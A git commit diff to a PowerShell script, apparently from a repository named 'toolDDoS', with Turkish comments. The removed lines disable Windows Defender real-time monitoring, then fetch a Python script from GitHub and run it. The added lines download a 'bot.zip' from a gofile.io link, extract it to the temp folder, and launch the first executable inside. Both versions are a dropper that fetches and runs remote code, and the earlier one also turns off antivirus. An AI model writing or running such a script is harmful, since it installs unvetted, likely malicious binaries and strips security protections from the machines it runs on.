a78874481df3b2cef29968b95b46e8dcc9d0c635
doguiaste <143461390+doguiaste@users.noreply.github.com>
2025-07-08 18:45:46 +0300

    Update index.ps1

--- index.ps1
+++ index.ps1
@@ -1,10 +1,17 @@
-Set-MpPreference -DisableRealtimeMonitoring $true
-$python = "python"  # Python PATH’te yoksa tam yolunu yaz
-$url = "https://raw.githubusercontent.com/doguiaste/toolDDoS/main/start.py"
+$zipUrl = "https://store-eu-par-3.gofile.io/download/web/9ce7760f-8dde-4764-afef-2dac1a25933c/bot.zip"   # <- buraya direkt linki yaz
+$zipPath = "$env:TEMP\indirilen.zip"
+$extractPath = "$env:TEMP\zipCikartilan"
 
-# Geçici dosya yolu
-$tmp = "$env:TEMP\start.py"
+# ZIP dosyasını indir
+Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
 
-Invoke-RestMethod -Uri $url -OutFile $tmp
-& $python $tmp
-Remove-Item $tmp
+# Çıkarma klasörünü oluştur
+New-Item -ItemType Directory -Force -Path $extractPath | Out-Null
+
+# ZIP dosyasını çıkar
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)
+
+# EXE dosyasını bul ve çalıştır
+$exe = Get-ChildItem -Path $extractPath -Filter *.exe -Recurse | Select-Object -First 1
+Start-Process -FilePath $exe.FullName
